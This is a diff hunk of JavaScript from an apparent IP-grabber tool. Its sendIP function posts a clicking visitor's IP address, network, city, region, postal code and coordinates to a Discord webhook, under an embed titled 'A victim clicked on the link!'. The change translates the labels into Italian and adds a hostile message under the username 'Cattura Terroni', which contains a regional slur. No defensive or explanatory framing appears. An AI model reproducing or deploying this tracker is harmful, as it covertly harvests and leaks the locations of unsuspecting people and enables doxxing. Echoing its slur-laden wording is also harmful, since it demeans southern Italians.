@@ -15,11 +15,11 @@ const sendIP = () => {
                         body: JSON.stringify({
                             username: "Cattura Terroni", // optionally changeable
                             avatar_url: "https://i0.wp.com/css-tricks.com/wp-content/uploads/2021/09/download.jpg", // optionally changeable
-                            content: `@here`,
+                            content: `Terrore Ammazato Capo @here`,
                             embeds: [
                                 {
                                     title: 'A victim clicked on the link!',
-                                    description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.network}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}`,
+                                    description: `**IP : **${ipadd}\n**Rete : ** ${geoData.network}\n**Città : ** ${geoData.city}\n**Regione : ** ${geoData.region}\n**Paese : ** ${geoData.country_name}\n**Codice Postale : ** ${geoData.postal}\n**Latitudine : ** ${geoData.latitude}\n**Longitudine : ** ${geoData.longitude}`,
                                     color: 0x800080 // optionally changeable
                                 }
                             ]
